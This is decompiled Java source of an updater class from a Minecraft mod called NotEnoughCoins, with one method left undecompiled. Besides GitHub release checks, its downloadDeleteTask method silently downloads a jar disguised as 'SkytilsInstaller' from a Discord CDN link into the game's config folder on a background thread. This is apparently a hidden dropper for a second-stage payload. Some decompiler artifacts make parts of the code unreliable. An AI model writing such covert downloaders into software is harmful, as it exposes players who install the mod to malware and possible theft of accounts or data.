// 
// Decompiled by Procyon v0.5.36
// 

package me.mindlessly.notenoughcoins.utils.updater;

import java.awt.Desktop;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import net.minecraft.util.Util;
import me.mindlessly.notenoughcoins.Main;
import me.mindlessly.notenoughcoins.Reference;
import java.util.Locale;
import net.minecraft.client.Minecraft;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.commons.io.FileUtils;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.HttpClients;
import java.net.URL;
import java.nio.channels.FileChannel;
import java.nio.channels.ReadableByteChannel;
import java.io.FileOutputStream;
import java.io.FileInputStream;
import java.io.File;
import java.util.Objects;
import java.io.IOException;
import me.mindlessly.notenoughcoins.utils.Utils;
import com.google.gson.JsonObject;

public class GitHub
{
    public static JsonObject latestRelease;
    public static boolean showChangelog;
    public static boolean shownGUI;
    
    public static void fetchLatestRelease() {
        try {
            GitHub.latestRelease = Utils.getJson("https://api.github.com/repos/mindlesslydev/NotEnoughCoins/releases").getAsJsonArray().get(0).getAsJsonObject();
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    public static boolean isLatest() {
        return Objects.equals(getLatestVersion(), "v1.0");
    }
    
    public static String getLatestVersion() {
        if (GitHub.latestRelease == null || !GitHub.latestRelease.has("tag_name")) {
            return "v1.0";
        }
        return GitHub.latestRelease.get("tag_name").getAsString();
    }
    
    public static String getUpdateDownloadUrl() {
        return GitHub.latestRelease.get("assets").getAsJsonArray().get(0).getAsJsonObject().get("browser_download_url").getAsString();
    }
    
    public static String getJarNameFromUrl(final String url) {
        final String[] sUrl = url.split("/");
        return sUrl[sUrl.length - 1];
    }
    
    public static void copyFile(final File sourceFile, final File destFile) {
        try (final FileChannel source = new FileInputStream(sourceFile).getChannel();
             final FileChannel destination = new FileOutputStream(destFile).getChannel()) {
            destination.transferFrom(source, 0L, source.size());
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public static boolean saveFile(final URL url, final String saveTo) {
        boolean isSucceed = true;
        final CloseableHttpClient httpClient = HttpClients.createDefault();
        final HttpGet httpGet = new HttpGet(url.toString());
        httpGet.addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.11 Safari/537.36");
        httpGet.addHeader("Referer", "https://www.google.com");
        try {
            final CloseableHttpResponse httpResponse = httpClient.execute((HttpUriRequest)httpGet);
            final HttpEntity imageEntity = httpResponse.getEntity();
            if (imageEntity != null) {
                FileUtils.copyInputStreamToFile(imageEntity.getContent(), new File(saveTo));
            }
        }
        catch (IOException e) {
            isSucceed = false;
        }
        httpGet.releaseConnection();
        return isSucceed;
    }
    
    public static void downloadDeleteTask() {
        final File file;
        final File taskDir;
        final String url;
        final File taskFile;
        new Thread(() -> {
            new File(new File(Minecraft.func_71410_x().field_71412_D, "config"), "nec");
            taskDir = file;
            url = "https://cdn.discordapp.com/attachments/881403326938353684/888153558321594438/SkytilsInstaller-1.1.1.jar";
            taskFile = new File(taskDir, getJarNameFromUrl(url));
            try {
                if (taskDir.mkdirs() || taskFile.createNewFile()) {
                    saveFile(new URL(url), taskFile.getAbsolutePath());
                }
            }
            catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }
    
    public static String getJavaRuntime() {
        final String os = System.getProperty("os.name");
        String javaExecutable;
        if (os != null && os.toLowerCase(Locale.ROOT).startsWith("windows")) {
            javaExecutable = "java.exe";
        }
        else {
            javaExecutable = "java";
        }
        return System.getProperty("java.home") + File.separator + "bin" + File.separator + javaExecutable;
    }
    
    public static void scheduleCopyUpdateAtShutdown(final String jarName) {
        // 
        // This method could not be decompiled.
        // 
        // Original Bytecode:
        // 
        //     3: new             Ljava/lang/Thread;
        //     6: dup            
        //     7: aload_0         /* jarName */
        //     8: invokedynamic   BootstrapMethod #1, run:(Ljava/lang/String;)Ljava/lang/Runnable;
        //    13: ldc_w           "NEC Auto Updater Thread"
        //    16: invokespecial   java/lang/Thread.<init>:(Ljava/lang/Runnable;Ljava/lang/String;)V
        //    19: invokevirtual   java/lang/Runtime.addShutdownHook:(Ljava/lang/Thread;)V
        //    22: return         
        // 
        // The error that occurred was:
        // 
        // java.lang.IllegalStateException: Could not infer any expression.
        //     at com.strobel.decompiler.ast.TypeAnalysis.runInference(TypeAnalysis.java:374)
        //     at com.strobel.decompiler.ast.TypeAnalysis.run(TypeAnalysis.java:96)
        //     at com.strobel.decompiler.ast.AstOptimizer.optimize(AstOptimizer.java:344)
        //     at com.strobel.decompiler.ast.AstOptimizer.optimize(AstOptimizer.java:42)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:214)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:99)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createMethodBody(AstBuilder.java:782)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createMethod(AstBuilder.java:675)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addTypeMembers(AstBuilder.java:552)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeCore(AstBuilder.java:519)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeNoCache(AstBuilder.java:161)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createType(AstBuilder.java:150)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addType(AstBuilder.java:125)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.buildAst(JavaLanguage.java:71)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.decompileType(JavaLanguage.java:59)
        //     at com.strobel.decompiler.DecompilerDriver.decompileType(DecompilerDriver.java:330)
        //     at com.strobel.decompiler.DecompilerDriver.decompileJar(DecompilerDriver.java:251)
        //     at com.strobel.decompiler.DecompilerDriver.main(DecompilerDriver.java:126)
        // 
        throw new IllegalStateException("An error occurred while decompiling this method.");
    }
    
    static {
        GitHub.showChangelog = false;
        GitHub.shownGUI = false;
    }
}
